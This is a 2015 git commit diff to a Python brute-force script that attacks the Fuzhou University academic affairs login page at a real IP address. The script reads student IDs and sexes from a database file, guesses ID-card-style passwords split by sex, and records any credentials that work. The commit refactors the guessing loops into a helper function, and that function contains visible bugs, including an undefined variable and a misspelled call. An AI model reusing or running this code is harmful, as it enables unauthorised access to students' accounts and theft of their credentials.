ca2080bf7e17345a999058a85c20be9aa271b8ed
Wdeil <wyxupon@163.com>
2015-09-10 21:53:04 +0800

    Update BlastingUsingDB.py
    1: Delete some redundant code;
    2: Fix some errors.

--- BlastingUsingDB.py
+++ BlastingUsingDB.py
@@ -16,43 +16,62 @@ import os, re, time
 from urllib import request, parse, error
 
 def MaleDictionary():
-	for x in range(32)[1:]:
+	for x in range(1, 32):
 		for y in range(100):
 			for z in range(1, 10, 2):
 				for w in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'x'):
 					yield (format(x, '02d') + format(y, '02d') + str(z) + w)
 
 def FemaleDictionary():
-	for x in range(32)[1:]:
+	for x in range(1, 32):
 		for y in range(100):
 			for z in range(0, 10, 2):
 				for w in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'x'):
 					yield (format(x, '02d') + format(y, '02d') + str(z) + w)
 
+
+
 def Blasting():
+
 	url = 'http://59.77.226.32/logincheck.asp'
 	head = {
 		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
 		'Accept': 'text/html',
-		'Accept-Language': 'en-US,en;q=0.5',
 		'Accept-Encoding': 'gzip, deflate',
-		'DNT': '1',
 		'Referer': 'http://jwch.fzu.edu.cn/',
-		'Cookie': 'ASPSESSIONIDSATDARTQ=NFFMALJBPNBBLNGMHOMBLDPG'
 	}
 	data = {'Content-Type': 'application/x-www-form-urlencoded', 'muser': '', 'passwd': '', 'x': '0', 'y': '0'}
 	re_pass = re.compile('福州大学教务处本科教学管理系统')
 	re_user = re.compile('^user:\s*(\d{9})\s*sex:\s*(male|female)$')
-	t = -1
 
-	path = os.path.abspath('.')
-	r = open(path + '/BlastingResult.txt', 'a')
+	def Blast(bmuser, bpasswd):
+		for user in buser:
+			data['muser'] = user
+			for x in bpasswd:
+				data['passwd'] = x
+				req = request.Request(url, headers = head)
+				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
+				time.sleep(0.01)
+				try :
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
+				except error.HTTPError as e:
+					req = request.Ruequest(response.geturl(), headers = head)
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+				except error.URLError as e:
+					time.sleep(10)
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
+					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
+					r.flush()
+					print('Get the password of user: %s' % user)
+					fuser.remove(user)
+					break
 
 	muser = []
 	fuser = []
-	SQLpath = input('Please enter the abspath of the SQL: ')
-	s = open(SQLpath)
-	for x in s.readlines() 	:
+	DBpath = input('Please enter the abspath of the Database: ')
+	d = open(DBpath)
+	for x in d.readlines() 	:
 		y = re_user.match(x)
 		if y.group(2) == 'male':
 			muser.append(y.group(1))
@@ -61,6 +80,7 @@ def Blasting():
 	s.close()
 
 	dictpath = input('Please enter the abspath of your dictionary(or press enter): ')	
+	t = -1
 	passwd = []
 	if dictpath != '':
 		t = input('1: Only using dictionary given for blasting;\n2: if dictionary is useless, traverse.\n enter your choice: ')
@@ -68,93 +88,15 @@ def Blasting():
 		for x in d.readlines()[:-1] :
 			passwd.append(x)
 
-	if t != -1:
-		for user in muser:
-			data['muser'] = user
-			for x in passwd:
-				data['passwd'] = x[:-1]
-				req = request.Request(url, headers = head)
-				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
-				time.sleep(0.01)
-				try :
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
-				except error.HTTPError as e:
-					req = request.Ruequest(response.geturl(), headers = head)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				except error.URLError as e:
-					time.sleep(10)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
-					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
-					r.flush()
-					print('Get the password of user: %s' % user)
-					muser.remove(user)
-					break
-		for user in fuser:
-			data['muser'] = user
-			for x in passwd:
-				data['passwd'] = x[:-1]
-				req = request.Request(url, headers = head)
-				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
-				time.sleep(0.01)
-				try :
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
-				except error.HTTPError as e:
-					req = request.Ruequest(response.geturl(), headers = head)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				except error.URLError as e:
-					time.sleep(10)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
-					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
-					r.flush()
-					print('Get the password of user: %s' % user)
-					fuser.remove(user)
-					break
+	path = os.path.abspath('.')
+	r = open(path + '/BlastingResult.txt', 'a')
 
+	if t != -1:
+		Blast(muser, passwd)
+		Blast(fuser, passwd)
 	if t != 1:
-		for user in muser:
-			data['muser'] = user
-			for x in MaleDictionary():
-				data['passwd'] = x
-				req = request.Request(url, headers = head)
-				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
-				time.sleep(0.01)
-				try :
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
-				except error.HTTPError as e:
-					req = request.Ruequest(response.geturl(), headers = head)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				except error.URLError as e:
-					time.sleep(10)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
-					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
-					r.flush()
-					print('Get the password of user: %s' % user)
-					muser.remove(user)
-					break
-		for user in fuser:
-			data['muser'] = user
-			for x in FemaleDictionary():
-				data['passwd'] = x
-				req = request.Request(url, headers = head)
-				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
-				time.sleep(0.01)
-				try :
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
-				except error.HTTPError as e:
-					req = request.Ruequest(response.geturl(), headers = head)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				except error.URLError as e:
-					time.sleep(10)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
-					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
-					r.flush()
-					print('Get the password of user: %s' % user)
-					fuser.remove(user)
-					break
+		Blast(muser, MaleDictionary())
+		Blast(fuser, FemaleDictionary())
 
 	r.close()
 
